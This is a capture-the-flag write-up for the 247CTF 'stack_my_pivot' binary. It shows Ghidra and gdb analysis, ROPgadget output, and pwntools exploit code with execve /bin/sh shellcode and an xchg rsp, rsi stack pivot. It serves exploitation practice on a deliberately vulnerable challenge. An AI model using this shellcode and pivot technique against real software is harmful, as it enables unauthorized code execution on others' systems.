I found no writeup online for this challenge so here is one.

So There is the challenge:
![alt text](./screenshots/247Dashboard.png "Challenge infos")

We learn that the buffers will be small.
Let's look at it inside ghidra.

## Ghidra

Nothing interesting in the main function, let's look at the chall function.

![alt text](./screenshots/ghidra_chall.png "ghidra chall")

So two buffers, the first one is large but cannot be overflowed the second is very small but can be overflowed by 8 bytes.

It appears simple enough, put some shellcode inside the first one, jump to it from the second one.

Let's analyze all this in gdb.



## GDB

First let's check security and permissions.
> checksec ./stack_my_pivot

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```

No PIE, nice. 64bit, wait we only read 24bytes, that's not a lot. Well this probably wont be a problem later.

I use gdb gef but use whatever you want

> gef> vmmap

```

```

Executable stack, nice. Let's assume ASLR is on (it is).

Ok let's see what registers we can overwrite.
We now the read is 0x1c so 24.

> pattern create 28
```
[+] Generating a pattern of 28 bytes
aaaaaaaabaaaaaaacaaaaaaadaaa
[+] Saved as '$_gef0
```

We know the first one cannot be overflowed so let's not bother trying it.

> gefâž¤  c
```
Continuing.
[+] Welcome!

aaaaaaaabaaaaaaacaaaaaaadaaa
```

![alt text](./screenshots/register_overflow.png "register overflow")

So we write *%rsi* and we overwrite the 4 lower bytes of *%rip*, shit.

## Pwntools

Let's start using pwntools:
> pwn template ./stack_my_pivot --host 866e421af4e2b022.247ctf.com --port 50086 > exploit.py

I also like to add 
```
context.terminal = ['tmux', 'splitw', '-h']
```

To make debugging a real pleasure

``` python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ../stack_my_pivot --host 866e421af4e2b022.247ctf.com --port 50086
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('../stack_my_pivot')
context.terminal = ['tmux', 'splitw', '-h']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '866e421af4e2b022.247ctf.com'
port = int(args.PORT or 50086)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
```

We also know that *%rip* is at offset 24/

``` python
rip_offset = 24
```

We know that the stack is executable so let's put some shellcode inside the first buffer

``` python
def send_shellcode():
    shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05" #shellcraft.sh() has invalid chars

    log.info("sending shellcode")
    io.sendline(shellcode)
```

shellcode is from ["shellstorm"](http://shell-storm.org/shellcode/files/shellcode-905.php)

Now we fill the first buffer with shellcode, let's jump to it.

We need to modify %rsp% to point at the first buffer.
After the overflow the function leaves and calls main so the 4 higher byter of *%rsi* will be all zeroes so we can use a gadget in this range by overwriting the four lower bytes.

What gadgets do we have:

> ROPgadget --binary ./stack_my_pivot

There's a lot so let focus on what we want.
We want *%rsp* to point at one of the buffers since it is where we can execute code. 
Good news *%rsi* contains the address of the second buffer.

Let's see if we can use that.

> ROPgadget --binary ./stack_my_pivot | grep "rsi"

```
0x0000000000400730 : mov ebp, esp ; xchg rsp, rsi ; nop ; pop rbp ; ret
0x000000000040072f : mov rbp, rsp ; xchg rsp, rsi ; nop ; pop rbp ; ret
0x0000000000400831 : pop rsi ; pop r15 ; ret
0x000000000040072e : push rbp ; mov rbp, rsp ; xchg rsp, rsi ; nop ; pop rbp ; ret
0x0000000000400732 : xchg rsp, rsi ; nop ; pop rbp ; ret
```

Good that's a lot less. Last one seems intresting.
xchg exchanges the value of two registers, sweet we can make *%rsp* point at our second buffer and the *ret* instruction will load it inside *%rip*.
Only thing is, *pop* increases the value of *%rsp* by 8, we loose 8bytes of our already tiny buffer, well we will have to do like that.

So now we can go to *%rsp* the problem being we want to go to what's inside it, we need a *jmp rsp*, conveniently there is one.

> ROPgadget --binary ../stack_my_pivot | grep "jmp" | grep "rsp"

```
0x0000000000400738 : jmp rsp
```

Great, so in theory we have what we need to execute some code inside the seconde buffer. Let's see what it looks like in pwntools:

``` python

jmp_rsp = 0x400738 #jmp rsp gadget
gadget = 0x400732  # exch rsi, rsp; pop rbp; ret

def send_payload():
    payload = 8 * b'\x90' #The pop rbp adds 8 to rsp so this instruction is ignored
    payload += p64(jmp_rsp) #Jmp rsp gadget which allows us to execute code
    payload += 8 * b'\x90' # 8bytes of code we can actually write
    payload += p64(gadget) # exch rsi, rsp; pop rbp; ret

    log.info("sending payload")
    io.sendline(payload)
```

Now with the 8 bytes of instructions we have we need to set *%rsp* so the value of the first bigger buffer and jump to it.

Both buffers are on the stack, so they will always have the same distance between them.

![alt text](./screenshots/buffers_difference.png "buffer difference")

Oh ghidra how did people do before you came out.

So the first buffer that contains our shellcode is always *0x40* before the second.

So now we have everything we need, we substract 0x40 from *%rsp* and jmp to it.

```
def send_payload():
    payload = 8 * b'\x90' #The pop rbp adds 8 to rsp so this instruction is ignored
    payload += p64(jmp_rsp) #Jmp rsp gadget which allows us to execute code
    payload += asm("sub rsp,0x40; jmp rsp; nop; nop")
    payload += p64(gadget) # exch rsi, rsp; pop rbp; ret

    log.info("sending payload")
    io.sendline(payload)
```

We had two *nop* so that the payload stays aligned.
So yay it should work, well it doesn't.

The pop which occurs after the register exchange added 8 to *%rsp* and the *ret* instruction added 2.


```
def send_payload():
    payload = 8 * b'\x90' #The pop rbp adds 8 to rsp so this instruction is ignored
    payload += p64(jmp_rsp) #Jmp rsp gadget which allows us to execute code
    payload += asm("sub rsp,0x50; jmp rsp; nop; nop")
    payload += p64(gadget) # exch rsi, rsp; pop rbp; ret

    log.info("sending payload")
    io.sendline(payload)
```

## Win

Yes, I had a lot of trouble on this challenge and spent a whole night on it. There were no writeups online so I really had to struggle but I learned a lot.

Full exploit is on the repo but you should try to redo it by yourself.

## Thanks
I was really stuck on this challenge and the creator [Razvi](https://twitter.com/Razvieu) had the kindness of helping me ! Thanks to him for his time and for the challenge.
